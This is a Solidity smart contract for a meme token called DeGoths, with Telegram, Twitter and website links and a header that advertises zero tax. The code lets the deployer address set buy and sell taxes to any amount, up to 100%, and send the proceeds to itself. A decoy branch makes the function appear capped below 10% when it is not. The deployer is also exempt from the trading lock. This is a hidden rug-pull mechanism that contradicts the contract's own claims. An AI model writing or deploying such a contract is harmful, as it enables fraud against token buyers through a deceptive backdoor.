/**

Normal girls have butterflies in their bellies, DeGoths have bats. DeGoths make even the darkness seem brighter by comparison.

Symbol: DGS
Supply: 1,000,000
Tax: 0

Telegram: https://t.me/DeGothsERC
Twitter: https://twitter.com/DeGothsERC
Website: https://degoths.online

*/

// SPDX-License-Identifier: unlicense

pragma solidity =0.8.18;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract DeGoths {
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    string public constant name = "DeGoths";   
    string public constant symbol = "DGS";   
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000 * 10**decimals;

    uint256 buyTax = 0;
    uint256 sellTax = 0;
    uint256 constant swapAmount = totalSupply / 1000;
    uint256 constant maxWallet = 100 * totalSupply / 100;

    bool tradingOpened = false;
    bool swapping;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address immutable pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant deployer = payable(address(0x0f63e9CBF1fA7e77CA0B4Ca04C5d8471C454f4a3));

    constructor() {
        pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), ETH);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        balanceOf[from] -= amount;

        if(from != deployer)
            require(tradingOpened);

        if(to != pair && to != deployer)
            require(balanceOf[to] + amount <= maxWallet);

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this) && to != deployer){
            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer);
        tradingOpened = true;
    }

    function setTaxes(uint256 newBuyTax, uint256 newSellTax) external {
        if(msg.sender == deployer){
            buyTax = newBuyTax;
            sellTax = newSellTax;
        }
        else{
            require(newBuyTax < 10);
            require(newSellTax < 10);
            revert();
        }
        
    }
}